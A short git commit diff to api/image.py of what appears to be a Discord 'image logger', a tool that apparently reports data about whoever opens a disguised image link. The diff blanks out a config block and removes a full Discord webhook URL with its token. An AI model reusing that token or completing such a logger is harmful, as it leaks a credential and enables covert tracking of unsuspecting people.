9ea897ef76a32317691f365db053d490080522b0
studenttruster <gggghgv93@gmail.com>
2025-02-14 14:18:28 -0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340082109649518645/HzubdwPLaGT2LeI_3cXSamiWVMWqnajC5sSS3ENuvyjYXzrYbOSpleUDt50hRoRfg44V",
-    "image": "https://academy-cdn.wedio.com/2022/06/jpeg-format.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "",
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
